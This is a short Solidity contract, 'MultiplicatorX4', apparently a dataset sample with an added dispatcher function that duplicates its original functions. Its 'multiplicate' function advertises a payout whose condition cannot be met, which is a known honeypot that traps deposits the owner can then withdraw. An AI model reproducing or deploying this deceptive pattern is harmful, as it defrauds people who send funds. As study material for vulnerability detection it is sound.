pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            adr.transfer(this.balance+msg.value);
        }
    }

    // Unified dispatcher - merged from: Command, withdraw, multiplicate
    // Selectors: Command=0, withdraw=1, multiplicate=2
    function execute(uint8 _selector, address adr, bytes data) public payable {
        // Original: Command()
        if (_selector == 0) {
            require(msg.sender == Owner);
            adr.call.value(msg.value)(data);
        }
        // Original: withdraw()
        else if (_selector == 1) {
            require(msg.sender == Owner);
            Owner.transfer(this.balance);
        }
        // Original: multiplicate()
        else if (_selector == 2) {
            if(msg.value>=this.balance)
            {
            adr.transfer(this.balance+msg.value);
            }
        }
    }
}